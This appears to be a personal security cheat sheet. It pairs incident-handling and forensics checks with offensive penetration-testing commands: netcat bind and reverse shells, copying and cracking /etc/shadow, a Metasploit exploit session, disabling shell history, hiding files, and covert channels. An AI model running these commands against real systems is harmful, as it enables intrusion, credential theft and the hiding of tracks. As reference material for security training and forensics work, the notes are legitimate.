# incident handling & forensics

## unusual procs/services
ps aux
lsof -p [pid]
# which services are enabled at which runlevels
chkconfig --list

## unusual files
find / -uid 0 -perm -4000 -print
find / -size +10000k -print
find / -name " " -print
find / -regex ' .+[^A-Za-z0-9(+=_-/.,!@#$%^&*~:;)]' -print
# unlinked files
[unlink /tmp/nc]
lsof +L1
# verify pkgs
rpm -Va | sort
check-packages

## unusual network usage
ip link | grep PROMISC
# port listeners
# show pid (linux)
netstat -nap
# list all Internet network files
lsof -i
arp -a

## unusual scheduled tasks
crontab -u root -l
cat /etc/crontab
ls /etc/cron.*

## unusual accounts
sort -nk3 -t: /etc/passwd | less
grep :0: /etc/passwd
# find orphaned files
find / -nouser -print

## unusual logs

## other unusual activity
uptime
free
df

# dns zone transfer
dig @[authoritative dns ip] -t AXFR

# create a local copy of a website
wget -r website.com

chkconfig [service] off

# list available services (might work with no password: null sessions)
smbclient -L [target_ip]
smbclient -L [target_ip] -U [user]

# hiding files
mkdir " "
mkdir ".. "

# prevent shell from storing history
export HISTSIZE=0

# send covert message in ip ids
covert_tcp -dest 10.0.0.1 -source 10.0.0.2 -source_port 8888 -dest_port 9999
-server -file /tmp/receive/receive.txt
#
covert_tcp -dest 10.0.0.2 -source 10.0.0.2 -source_port 9999 -dest_port 8888
-file /tmp/send/send.txt
# see ip ids
tcpdump -nnvvX -i eth0

# capture full ethernet (1500 MTU + header)
tcpdump -nn -i en0 -s 1514 -w file.cap 'tcp and port 5050'

# ring buffer after every 10000K
tshark -i en0 -b filesize:10000 -w foo -n

# can list files hidden by rootkits (vs ls)
echo *

## backtrack

# milw0rm on backtrack 2
cat sploitlist.txt | grep -i exploit

# renew dhcp lease
dhcpcd -n

## nmap

# send spoofed packets of scans from other hosts
nmap -D...

# OS fingerprint a web site
sudo nmap -sS -p 80 -O -v <host>

# ping scan
nmap -sP -v 10.1.1.0/24

nmap -sS -P0 -nAF 10.1.1.1

# send trigger for ftp only
amap -1 -qbp http 10.1.1.1 1-65535

## passwd cracking

cp /etc/passwd /tmp/passwd-org
cp /etc/shadow /tmp/shadow-org
unshadow /tmp/passwd-org /tmp/shadow-org > /tmp/combined
john /tmp/combined
shred --remove /tmp/passwd-org
shred --remove /tmp/shadow-org
shred --remove /tmp/combined
shred --remove .../john.pot

## netcat

# Windows
nc -l -p [port] -e cmd.exe
# Unix
nc -l [port] -e /bin/sh
# persistent
# Windows
nc -L -p [port] -e cmd.exe
# Unix
while [ 1 ]; do echo "Started"; nc -l -p [port] -e /bin/sh; done
# shoveling shell
nc -l -p [port]
nc [ip] [port] -e /bin/sh
# one-way relay
nc -l -p 11111 | nc [target_ip] 54321
# two-way relay
# three-netcat (sloppy: split response)
nc -l -p 11111 | nc next_hop 54321 | nc previous_hop 22222
# batch file  [nc next_hop 54321] (Windows)
nc -l -p 11111 -e ncrelay.bat
# inetd
11111 stream tcp nowait nobody /usr/sbin/tcpd /usr/bin/nc next_hop 54321
# backpipe
mknod backpipe p
nc -l -p 11111 0<backpipe | nc next_hop 54321 1>backpipe
# push a file from listener to client (you can use a web browser to get it)
nc -l -p [port] < [file]
nc [ip] [port] > [file]
# pull a file from client to listener
nc -l -p [port] > [file]
nc [ip] [port] < [file]
# port scan
nc -v -w3 -z [target_ip] [start_port]-[end_port]
# replay attack
nc?

## nessus

nasl -k /opt/nessus/var/nessus/<user>/kbs/<target>  -t <target>
codesupport_activex_code_exec.nasl

## metasploit

# metasploit 3.0-beta-dev -> 3.1-dev (revision 4999)
# 179 -> 200 exploits - 104 -> 106 payloads
# 17 encoders - 5 nops
# 30 -> 38 aux
./msfconsole
# shows only currently available commands
help
setg
setg Logging
setg RHOST 192.168.108.107
# save to ~/.msf/config
save
show exploits
info windows/smb/ms06_040_netapi
use windows/smb/ms06_040_netapi
back
use windows/smb/ms06_040_netapi
show targets
set TARGET 2
show options
set RHOST 10.37.129.4
show advanced
show payloads
info generic/shell_bind_tcp
set PAYLOAD generic/shell_bind_tcp
show options
check
exploit

sessions -l

sessions -i 1

# metasploit 2.7
# 158 exploits - 76 payloads
svn update

## tools

# reconnaissance
whois (domain)
nslookup (dns)
dig (dns)
google.com (kitchen sink)
sitedigger (google api)*
wikto (google api)*
sam spade (kitchen sink)*
dnsstuff.com (kitchen sink)
# scanning
netstumbler (wifi discover)*
wellenreiter (wifi discover)*
kismet (wifi sniffer)
wepcrack (wep crack)
airsnort (wep crack)
karma (wifi sniffer/proxy)
asleap (LEAP crack)
cheops-ng (network map)
!etherape (network map)
!nmap (port scan)
!amap (application protocol detection)
active ports (port list on localhost)
!p0f (passive os finger)
firewalk (analyze firewalls)
tcptraceroute (analyze firewalls)
fragrouter (bypass ids/ips)
fragroute (bypass ids/ips)
!nessus (scan vulnerabilities)
nikto (cgi scanner)
!enum (null sessions)*
!winfingerprint (null sessions)*
smbclient
# exploit
!netcat (kitchen sink) (awesome)
!wireshark (sniffer) (awesome)
sniffit (sniffer)
!dsniff (sniffer)
ettercap (hijack session)
!metasploit (exploit engine)
tftp (&nc)
!thc hydra (password crack)
cain & abel (kitchen sink: passwd)*
pwdump3 (passwd)
!fgdump (passwd) (awesome)
ntpasswd (passwd)
!john (passwd)
!psexec (start remote proc)*
scoopy (check if virtual)
vmdetect (check if virtual)*
red pill (check if virtual)*
owasp (web apps)
achilles (edit http sessions)*
paros (web apps proxy)*
# keep access
#backdoors
#rootkits
# cover tracks
lads (ads)*
streams (ads)*
winzapper (edit event logs)*
reverse www shell (covert channel)*
loki (covert channel)*
cover_tcp (covert channel using headers)
nushu
cdoor
sadoor
s-tools (stego)
hydan (stego)*
stegdetect (detect stego)

gen
